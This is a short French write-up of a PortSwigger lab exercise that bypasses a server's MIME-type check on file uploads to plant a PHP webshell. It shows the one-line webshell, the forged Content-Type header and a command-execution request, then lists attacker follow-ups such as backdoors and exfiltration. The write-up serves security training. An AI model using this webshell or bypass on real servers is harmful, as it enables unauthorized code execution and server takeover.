
# 🧨 Mission 4.4 – Upload, Fichier temporaire & Exécution webshell (RCE)

---

## 🎯 Objectif
Exploiter un formulaire d’upload vulnérable pour injecter un fichier `.php` et obtenir une exécution de code distante (RCE), en contournant les protections basées sur le type MIME.

---

## 🧠 Compétences développées

| Compétence | Détail |
|------------|--------|
| 🔎 Analyse des headers | Comprendre `Content-Type` et `Content-Disposition` |
| 🧠 Interception de requête | Utiliser Burp Suite pour manipuler une requête `POST` |
| 🎭 Bypass MIME | Contourner la protection côté serveur en trompant le type MIME |
| 💻 RCE Webshell | Obtenir l’exécution d’un script `.php` en environnement réel |
| 🔥 Observation serveur | Vérifier les erreurs de type 403/404 ou les changements de comportement |

🔧 Méthodologie utilisée
Connexion avec identifiants fournis au lab PortSwigger.

Création d’un fichier shell.php :

Interception de la requête POST via Burp Suite après sélection du fichier.

Modification manuelle de l’en-tête :

http
Copier
Modifier
Content-Type: image/jpeg
➜ pour tromper la vérification serveur.

Envoi de la requête modifiée ➜ l’upload est accepté.

Accès à l’URL du shell avec paramètre :

<?php system($_GET['cmd']); ?>

/files/shell.php?cmd=whoami
✅ Le shell a été interprété et la commande exécutée avec succès.

📊 Évaluation stratégique
Facteur	Évaluation
✴️ Risque	⭐⭐⭐⭐⭐ – Peut permettre une prise de contrôle du serveur
🌍 Réalisme	⭐⭐⭐ – Courant dans les vieilles applis, intranets et devs internes

🛡️ Ce que cette mission t’a appris
Comment manipuler les en-têtes HTTP (MIME, extension) pour contourner les restrictions serveur.

À analyser le comportement d’un upload, même quand tout semble bloqué côté frontend.

À utiliser Burp Suite comme un proxy offensif pour forcer le passage.

À identifier un point de RCE web silencieux et potentiellement critique.

🧠 Hypothèse offensive
Un attaquant :

Peut installer un backdoor PHP persistant.

Peut scanner le système ou s’introduire dans le réseau interne.

Peut exfiltrer des fichiers en injectant des commandes système via le shell.

🏅 Badge obtenu
📥💀 Payload Smuggler

Tu fais passer des armes dans un sac à dos de randonneur.